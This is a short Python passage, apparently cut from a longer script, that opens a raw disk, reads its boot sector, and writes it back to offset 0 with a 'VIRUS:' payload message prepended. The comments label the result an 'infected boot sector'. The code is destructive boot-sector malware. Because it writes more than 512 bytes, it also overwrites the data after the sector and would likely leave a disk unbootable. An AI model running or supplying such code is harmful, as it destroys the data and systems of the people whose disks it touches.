    with open(disk_path, "rb+") as disk:
        # Read the current boot sector
        boot_sector = disk.read(512)
        
        # Create a new boot sector with the payload message
        infected_boot_sector = b"VIRUS: " + payload_message.encode() + b"\n" + boot_sector
        
        # Write the infected boot sector back to the disk
        disk.seek(0)
        disk.write(infected_boot_sector)
        
        # Ensure the changes are written to the disk
        disk.flush()
